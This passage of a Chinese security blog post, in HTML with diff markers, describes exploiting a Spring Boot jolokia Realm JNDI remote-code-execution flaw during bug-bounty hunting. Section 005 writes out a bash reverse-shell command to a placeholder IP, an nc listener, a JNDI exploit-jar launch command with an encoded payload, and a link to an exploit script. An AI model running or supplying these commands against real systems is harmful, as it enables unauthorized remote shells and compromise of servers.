+<h3 id="jolokia-Realm-JNDI-RCE利用条件："><a href="#jolokia-Realm-JNDI-RCE利用条件：" class="headerlink" title="jolokia Realm JNDI RCE利用条件："></a>jolokia Realm JNDI RCE利用条件：</h3><ul>
+<li>目标网站/jolokia/list 接口查看是否存在 type=MBeanFactory 和 createJNDIRealm 关键词     ☑️</li>
+<li>目标可以请求攻击者的服务器（请求可出外网）         ☑️  dnslog探测成功</li>
+</ul>
+<p><img data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img20220221234949.jpg" alt="img" data-caption="img" loading="lazy"></p>
+<p>这两个起初基础条件都符合啊，于是我就不信邪，继续刚这个RCE利用，参考复现文章搭建的利用环境，vps有http请求，但死活就是弹不回shell，于是开始怀疑人生重新检查复现步骤，步骤无错误！！！于是触发思考</p>
+<p>1、利用JNDI 注入触发漏洞</p>
+<p>2、会不会是版本问题？</p>
+<p>3、是否也可以借鉴log4j漏洞复现？</p>
+<h2 id="005—峰回路转"><a href="#005—峰回路转" class="headerlink" title="005—峰回路转"></a>005—峰回路转</h2><p>利用JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar快速搭建漏洞利用环境</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">反弹shell：bash -c <span class="hljs-string">&#x27;exec bash -i &amp;&gt;/dev/tcp/111.111.111.111/4444 &lt;&amp;1&#x27;</span><br><br>监听命令：nc -lnvp 4444<br><br>工具地址：https://github.com/Zard-ethan/JNDI-Injection-Exploit-1.0-SNAPSHOT-all<br><br>编码地址：https://www.jackson-t.ca/runtime-exec-payloads.html<br><br>启动命令：java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class="hljs-string">&quot;bash -c &#123;echo,ZGly&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> -A 111.111.111.111<br></code></pre></td></tr></table></figure>
+<p><img data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img20220221234953.jpg" alt="img" data-caption="img" loading="lazy"></p>
+<p>利用以下python脚本进行漏洞利用，修改脚本中目标与RMI利用地址，然后运行脚本</p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-realm-jndi-rce.py">https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-realm-jndi-rce.py</a></p>
+<p><img data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img20220221234957.jpg" alt="img" data-caption="img" loading="lazy"></p>
+<p><img data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img20220221235001.jpg" alt="img" data-caption="img" loading="lazy"></p>
+<h2 id="006—漏洞重复"><a href="#006—漏洞重复" class="headerlink" title="006—漏洞重复"></a>006—漏洞重复</h2><p>折腾到大半宿终于看到熟悉的弹窗成功反弹shell，不得不承认我也很菜，然而这也并不是什么新奇的利用方式，只是突然想到有时候我们可以稍微换换思路，或者一样能够起到异曲同共之妙，虽然这个已经被其他表哥先交了，但是我觉得挖src还是要靠自己心细，RCE不能经常有，但要是不放过任何一个参数，毕竟心细挖天下。</p>
+
+    
+  </article>
+
+  
+      
+
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+   
+    
+</div>
+
+  
+      <div class="nexmoe-post-footer">
+          
+      </div>
+  
+</div>
+            <div class="nexmoe-post-right">
+              <div class="nexmoe-fixed">
+                  <div class="nexmoe-tool"> 
+                    
+                      
+                        
+                          
+                          
+                              <button class="mdui-fab catalog" style="overflow:unset;">
+                                  <i class="nexmoefont icon-i-catalog"></i>
+                                  <div class="nexmoe-toc">
+                                      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#001%E2%80%94%E7%9F%A5%E5%B7%B2%E7%9F%A5%E5%BD%BC"><span class="toc-number">1.</span> <span class="toc-text">001—知已知彼</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#002%E2%80%94%E6%8A%95%E7%9F%B3%E9%97%AE%E8%B7%AF"><span class="toc-number">2.</span> <span class="toc-text">002—投石问路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#003%E2%80%94%E4%BE%9D%E6%A0%B7%E7%94%BB%E7%93%A2"><span class="toc-number">3.</span> <span class="toc-text">003—依样画瓢</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#004%E2%80%94%E8%BF%B7%E9%80%94%E7%9F%A5%E8%BF%94"><span class="toc-number">4.</span> <span class="toc-text">004—迷途知返</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#jolokia-Realm-JNDI-RCE%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6%EF%BC%9A"><span class="toc-number">4.1.</span> <span class="toc-text">jolokia Realm JNDI RCE利用条件：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#005%E2%80%94%E5%B3%B0%E5%9B%9E%E8%B7%AF%E8%BD%AC"><span class="toc-number">5.</span> <span class="toc-text">005—峰回路转</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#006%E2%80%94%E6%BC%8F%E6%B4%9E%E9%87%8D%E5%A4%8D"><span class="toc-number">6.</span> <span class="toc-text">006—漏洞重复</span></a></li></ol>
+                                  </div>
+                              </button>
+                          
+                          
+                      
+                    
+                      <a href="#nexmoe-content" class="toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
+                  </div>
+              </div>
+            </div>
+        </div>
+    </div>
+    <div id="nexmoe-search-space">
+	<div class="search-container">
+		<div class="search-header">
+			<div class="search-input-container">
+				<input
+					class="search-input"
+					type="text"
+					placeholder="搜索"
+					oninput="sinput();"
+				/>
+			</div>
+			<a class="search-close" onclick="sclose();">×</a>
+		</div>
+		<div class="search-body"></div>
+	</div>
+</div>
+
+    
+<script src="/lib/mdui_043tiny/mdui.js"></script>
+<script src="/lib/fancybox/fancybox.umd.js"></script>
+
+
+ 
+
+<script async src="/js/app.js?v=1665474214423"></script>
+
+
+
+</body>
+
+</html>
